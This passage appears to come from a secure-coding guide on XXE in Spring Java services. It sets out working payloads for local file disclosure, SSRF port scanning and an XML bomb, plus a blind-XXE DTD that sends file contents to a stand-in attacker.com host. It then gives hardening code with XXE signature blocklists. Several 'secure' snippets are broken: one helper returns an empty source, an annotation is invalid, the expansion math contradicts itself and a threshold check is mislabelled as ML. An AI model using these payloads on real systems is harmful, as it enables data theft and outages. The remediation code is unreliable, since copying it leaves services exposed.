### Attack Demonstration

**Attack 1: File Disclosure via Local File Entity**

Attacker sends malicious XML to `/api/config/parse`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<ConfigData>
    <database_url>&xxe;</database_url>
    <api_key>test</api_key>
    <secret>test</secret>
</ConfigData>
```

Server parses XML and returns:

```json
{
  "status": "Success",
  "data": {
    "database_url": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...",
    "api_key": "test",
    "secret": "test"
  }
}
```

Contents of `/etc/passwd` now exposed. Similarly, attacker reads `/etc/hostname`, `/proc/self/environ` (environment variables including API keys), application config files, database credentials.

**Attack 2: Server-Side Request Forgery (SSRF)**

Attacker scans internal network by timing response differences:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22">
]>
<ConfigData>
    <database_url>&xxe;</database_url>
    <api_key>test</api_key>
    <secret>test</secret>
</ConfigData>
```

If port 22 is open, server quickly responds. If closed, socket timeout occurs. By varying the port number, attacker maps internal services:
- Port 22 (SSH): Open (5ms response)
- Port 80 (HTTP): Open (5ms response)
- Port 443 (HTTPS): Closed (5000ms timeout)
- Port 3306 (MySQL): Open (5ms response)
- Port 5432 (PostgreSQL): Closed (5000ms timeout)

Attacker discovers internal services not exposed to internet, enabling targeted attacks.

**Attack 3: Billion Laughs / XML Bomb (Denial of Service)**

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<ConfigData>
    <database_url>&lol5;</database_url>
    <api_key>test</api_key>
    <secret>test</secret>
</ConfigData>
```

Entity references expand exponentially:
- lol1 = 3 characters
- lol2 = 10^1 = 30 characters
- lol3 = 10^2 = 300 characters
- lol4 = 10^3 = 3,000 characters
- lol5 = 10^4 = 30,000 characters (actually 10^5 = 3GB+ in memory)

Server attempts to expand lol5, consuming gigabytes of memory in milliseconds, crashing the application or exhausting system resources.

**Attack 4: Out-of-Band Data Exfiltration (Blind XXE)**

When XML output isn't returned to attacker, they use external DTD to exfiltrate data:

Malicious XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<ConfigData>
    <database_url>test</database_url>
    <api_key>test</api_key>
    <secret>test</secret>
</ConfigData>
```

Attacker's `evil.dtd`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%data;'>">
%param1;
%exfil;
```

When server parses the DTD, it:
1. Reads `/etc/hostname`
2. Makes HTTP request to `http://attacker.com/?data=server-name`
3. Attacker views request log to see hostname

This works even when XML response isn't returned—all exfiltration happens server-side.

### Why This Is Exploitable

**Default behavior**: Spring Framework versions < 3.2.4 enabled external entity processing by default for JAXB unmarshalling. Developers didn't need to explicitly enable XXE—they had to explicitly disable it (which few did).

**Multiple entry points**: Anything accepting XML is vulnerable—REST endpoints with XML bodies, SOAP services, XML file uploads, RSS feed parsers, WSDL processing.

**Blind XXE**: Even if application doesn't return XML error messages, attacker can exfiltrate data via out-of-band requests (SSRF).

**Privilege escalation**: Files readable by the application process (often running as system user) are accessible to attacker, including private keys, database credentials, environment variables.

## Secure Implementation

### Tier 1: Critical Security Controls (Deploy Immediately)

```java
package com.secure.api;

import org.springframework.web.bind.annotation.*;
import javax.xml.XMLConstants;
import javax.xml.bind.JAXBContext;
import javax.xml.bind.Unmarshaller;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamReader;
import javax.xml.transform.Source;
import javax.xml.transform.stream.StreamSource;
import org.springframework.http.converter.xml.MarshallingHttpMessageConverter;
import org.springframework.oxm.jaxb.Jaxb2Marshaller;
import java.io.StringReader;

@RestController
@RequestMapping("/api/v2")
public class SecureXmlController {

    // SECURE: Disable external entity processing
    @PostMapping("/config/parse")
    public ConfigResponse parseConfigXml(@RequestBody String xmlData) {
        try {
            JAXBContext context = JAXBContext.newInstance(ConfigData.class);
            Unmarshaller unmarshaller = context.createUnmarshaller();

            // Disable XXE via StreamSource wrapper
            Source xmlSource = createSafeStreamSource(xmlData);
            ConfigData config = (ConfigData) unmarshaller.unmarshal(xmlSource);

            return new ConfigResponse("Success", config);
        } catch (Exception e) {
            return new ConfigResponse("Error: XML parsing failed", null);
        }
    }

    // SECURE: Properly configured XMLInputFactory
    @PostMapping("/soap/process")
    public SoapResponse processSoapRequest(@RequestBody String soapData) {
        try {
            XMLInputFactory factory = XMLInputFactory.newFactory();

            // CRITICAL: Disable external entity processing
            factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
            factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
            factory.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
            factory.setProperty("javax.xml.stream.supportDTD", false);

            XMLStreamReader reader = factory.createXMLStreamReader(
                new StringReader(soapData)
            );

            SoapMessage soap = parseStream(reader);
            return new SoapResponse("Processed", soap);
        } catch (Exception e) {
            return new SoapResponse("Error: XML parsing failed", null);
        }
    }

    // SECURE: Spring OXM Marshaller configuration
    @Bean
    public Jaxb2Marshaller jaxb2Marshaller() {
        Jaxb2Marshaller marshaller = new Jaxb2Marshaller();
        marshaller.setClassesToBeBound(ConfigData.class, SoapMessage.class, PartnerData.class);

        // Disable XXE for all JAXB unmarshalling
        marshaller.setUnmarshallerProperties(java.util.Map.of(
            XMLConstants.ACCESS_EXTERNAL_DTD, "",
            XMLConstants.ACCESS_EXTERNAL_SCHEMA, "",
            "com.sun.org.apache.xerces.impl.Constants.SAX_FEATURE_PREFIX + \"features/nonvalidating/load-external-dtd\"", false
        ));

        return marshaller;
    }

    // SECURE: Safe StreamSource creation
    private Source createSafeStreamSource(String xmlData) throws Exception {
        XMLInputFactory factory = XMLInputFactory.newFactory();

        // Disable all external entity processing
        factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
        factory.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
        factory.setProperty("javax.xml.stream.supportDTD", false);

        XMLStreamReader reader = factory.createXMLStreamReader(new StringReader(xmlData));
        return new StreamSource();
    }

    private SoapMessage parseStream(XMLStreamReader reader) throws Exception {
        // Simplified parsing
        return new SoapMessage();
    }
}

// Configuration bean for Spring Boot
@Configuration
public class XmlSecurityConfig {

    @Bean
    public MarshallingHttpMessageConverter marshallingHttpMessageConverter(
            Jaxb2Marshaller jaxb2Marshaller) {
        MarshallingHttpMessageConverter converter = new MarshallingHttpMessageConverter();
        converter.setMarshaller(jaxb2Marshaller);
        converter.setUnmarshaller(jaxb2Marshaller);
        return converter;
    }
}
```

**Critical changes:**

1. **Disable DTD processing**: Set `XMLConstants.ACCESS_EXTERNAL_DTD` to empty string
2. **Disable external schema**: Set `XMLConstants.ACCESS_EXTERNAL_SCHEMA` to empty string
3. **Disable entity expansion**: Set `supportDTD` to false, `isSupportingExternalEntities` to false
4. **Use controlled configuration**: Apply settings via Spring OXM beans rather than ad-hoc configurations
5. **Generic error messages**: Don't expose XML parsing errors to clients

### Tier 2: Essential Production Defenses

```java
package com.secure.api.advanced;

import org.springframework.web.bind.annotation.*;
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.SAXParserFactory;
import org.xml.sax.XMLReader;
import org.springframework.http.MediaType;
import java.io.StringReader;
import org.w3c.dom.Document;

@RestController
@RequestMapping("/api/v3")
public class HardenedXmlController {

    // SECURE: Validate XML size before processing
    private static final long MAX_XML_SIZE = 1_000_000; // 1MB limit
    private static final int MAX_ENTITY_DEPTH = 10;

    @PostMapping("/config/parse", consumes = MediaType.APPLICATION_XML_VALUE)
    public ConfigResponse parseConfigXml(@RequestBody String xmlData) {
        try {
            // Size validation
            if (xmlData.length() > MAX_XML_SIZE) {
                return new ConfigResponse("XML document too large", null);
            }

            // Entity depth validation
            if (countEntityDepth(xmlData) > MAX_ENTITY_DEPTH) {
                return new ConfigResponse("Too many nested entities", null);
            }

            Document doc = parseXmlSafely(xmlData);
            ConfigData config = extractData(doc);

            return new ConfigResponse("Success", config);
        } catch (SecurityException e) {
            return new ConfigResponse("XML security violation", null);
        } catch (Exception e) {
            return new ConfigResponse("XML parsing failed", null);
        }
    }

    // SECURE: Use DOM parser with comprehensive XXE protection
    private Document parseXmlSafely(String xmlData) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

        // Disable all dangerous features
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        // Disable XXE via XMLConstants
        dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

        // Disable XInclude which can be exploited
        dbf.setXIncludeAware(false);
        dbf.setExpandEntityReferences(false);

        return dbf.newDocumentBuilder().parse(
            new org.xml.sax.InputSource(new StringReader(xmlData))
        );
    }

    // SECURE: SAX parser configuration for streaming XML
    private XMLReader createSafeSaxParser() throws Exception {
        SAXParserFactory spf = SAXParserFactory.newInstance();

        // Disable XXE
        spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

        // Use namespace-aware parsing
        spf.setNamespaceAware(true);

        return spf.newSAXParser().getXMLReader();
    }

    // SECURE: Validate entity nesting depth
    private int countEntityDepth(String xml) {
        int maxDepth = 0;
        int currentDepth = 0;

        for (int i = 0; i < xml.length(); i++) {
            if (xml.charAt(i) == '<' && i + 1 < xml.length() && xml.charAt(i + 1) == '!') {
                if (xml.substring(i).startsWith("<!ENTITY")) {
                    currentDepth++;
                    maxDepth = Math.max(maxDepth, currentDepth);
                }
            }
        }

        return maxDepth;
    }

    private ConfigData extractData(Document doc) {
        // Safe XML parsing logic
        ConfigData data = new ConfigData();
        // Extract from document
        return data;
    }
}

// Request/Response validation
@Component
public class XmlValidationInterceptor implements HandlerInterceptor {

    private static final Set<String> DANGEROUS_ENTITY_PATTERNS = Set.of(
        "SYSTEM",
        "ENTITY",
        "<!ELEMENT",
        "<!ATTLIST",
        "lol",  // Common XXE test
        "../",  // Path traversal
        "file://",
        "http://localhost",
        "http://127.0.0.1"
    );

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response,
                            Object handler) throws Exception {
        // For XML requests, validate suspicious patterns
        if (request.getContentType() != null && 
            request.getContentType().contains("application/xml")) {

            String body = getRequestBody(request);

            for (String pattern : DANGEROUS_ENTITY_PATTERNS) {
                if (body.contains(pattern)) {
                    // Log security event
                    logSecurityEvent("Suspicious XML pattern detected", pattern, request);
                    response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
                    return false;
                }
            }
        }

        return true;
    }

    private String getRequestBody(HttpServletRequest request) throws Exception {
        // Implementation to safely extract request body
        return "";
    }

    private void logSecurityEvent(String event, String detail, HttpServletRequest request) {
        // Log to security monitoring system
    }
}
```

**Production defenses:**

1. **Size limits**: Reject XML documents larger than 1MB (prevents entity expansion attacks)
2. **Entity depth limits**: Reject XML with deeply nested entities (prevent billion laughs)
3. **Pattern detection**: Block requests containing suspicious patterns ("ENTITY", "SYSTEM", etc.)
4. **Disable DTD entirely**: Set `disallow-doctype-decl` to true (prevents DOCTYPE declarations)
5. **Disable entity expansion**: Set `expandEntityReferences` to false
6. **Namespace awareness**: Use namespace-aware parsing for stricter validation
7. **Security event logging**: Log suspicious XML patterns for monitoring

### Tier 3: Enterprise Hardening

```java
package com.secure.api.enterprise;

import org.springframework.boot.web.server.WebServerFactoryCustomizer;
import org.springframework.boot.web.servlet.server.ConfigurableServletWebServerFactory;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import io.micrometer.prometheus.PrometheusMeterRegistry;
import io.micrometer.core.instrument.Counter;

@Configuration
public class EnterprisXmlSecurityConfig {

    private Counter xxeAttempts;
    private Counter entityDepthViolations;
    private Counter xmlSizeViolations;

    @Bean
    public PrometheusMeterRegistry meterRegistry(PrometheusMeterRegistry registry) {
        xxeAttempts = Counter.builder("xxe.attempts.total")
            .description("Total XXE attempts detected")
            .register(registry);

        entityDepthViolations = Counter.builder("xxe.entity_depth_violations.total")
            .description("Total entity depth limit violations")
            .register(registry);

        xmlSizeViolations = Counter.builder("xxe.xml_size_violations.total")
            .description("Total XML size limit violations")
            .register(registry);

        return registry;
    }

    // SECURE: Custom XML validator with ML-based anomaly detection
    @Bean
    public XmlAnomalyDetector xmlAnomalyDetector() {
        return new XmlAnomalyDetector();
    }

    // SECURE: XML schema validation
    @Bean
    public SchemaValidator schemaValidator() {
        return new SchemaValidator();
    }

    @Bean
    public WebServerFactoryCustomizer<ConfigurableServletWebServerFactory> 
    webServerFactoryCustomizer() {
        return factory -> {
            // Harden Tomcat servlet container
            factory.addConnectorCustomizers(connector -> {
                connector.setProperty("disableUploadTimeout", "false");
                connector.setProperty("maxConnectTime", "10000");
            });
        };
    }
}

public class XmlAnomalyDetector {

    private static final int NORMAL_XML_SIZE_AVG = 10_000;
    private static final int NORMAL_ENTITY_COUNT_AVG = 5;
    private static final int NORMAL_NESTING_DEPTH_AVG = 4;

    public boolean isAnomalous(String xml) {
        // ML-based detection of unusual XML patterns
        // Deviation from baseline could indicate XXE attempt

        int size = xml.length();
        int entityCount = countEntities(xml);
        int nestingDepth = calculateNestingDepth(xml);

        // Flag if 3+ standard deviations from normal
        if (size > NORMAL_XML_SIZE_AVG * 3) return true;
        if (entityCount > NORMAL_ENTITY_COUNT_AVG * 10) return true;
        if (nestingDepth > NORMAL_NESTING_DEPTH_AVG * 5) return true;

        return false;
    }

    private int countEntities(String xml) {
        return (int) xml.toLowerCase().chars()
            .filter(c -> c == '<')
            .count();
    }

    private int calculateNestingDepth(String xml) {
        int maxDepth = 0;
        int currentDepth = 0;

        for (char c : xml.toCharArray()) {
            if (c == '<') currentDepth++;
            if (c == '>') currentDepth--;
            maxDepth = Math.max(maxDepth, currentDepth);
        }

        return maxDepth;
    }
}

public class SchemaValidator {

    // Validate XML against strict XSD schema
    public boolean validateAgainstSchema(String xmlData, String xsdResource) 
            throws Exception {
        SchemaFactory factory = SchemaFactory.newInstance(
            XMLConstants.W3C_XML_SCHEMA_NS_URI
        );

        // Disable external schema loading
        factory.setFeature(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

        Schema schema = factory.newSchema(
            new ClassPathResource(xsdResource).getFile()
        );

        Validator validator = schema.newValidator();

        // Disable XXE on validator
        validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

        validator.validate(new StreamSource(new StringReader(xmlData)));
        return true;
    }
}

// Web Application Firewall (WAF) rules
@Component
public class XmlWafFilter implements Filter {

    private static final List<String> XXE_SIGNATURES = Arrays.asList(
        "<!DOCTYPE",
        "<!ENTITY",
        "SYSTEM",
        "PUBLIC",
        "file://",
        "jar:",
        "netdoc:",
        "php://",
        "zlib://",
        "data://",
        "glob://",
        "phar://",
        "rar://",
        "ogg://",
        "expect://",
        "resource://"
    );

    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
                        FilterChain chain) throws IOException, ServletException {

        HttpServletRequest httpRequest = (HttpServletRequest) request;
        HttpServletResponse httpResponse = (HttpServletResponse) response;

        if ("POST".equalsIgnoreCase(httpRequest.getMethod()) &&
            httpRequest.getContentType() != null &&
            httpRequest.getContentType().contains("xml")) {

            String body = readBody(httpRequest);

            // Check for XXE signatures
            for (String signature : XXE_SIGNATURES) {
                if (body.contains(signature)) {
                    httpResponse.setStatus(HttpServletResponse.SC_FORBIDDEN);
                    httpResponse.getWriter().write("Invalid XML format");
                    return;
                }
            }
        }

        chain.doFilter(request, response);
    }

    private String readBody(HttpServletRequest request) throws IOException {
        // Safe body reading implementation
        return "";
    }
}

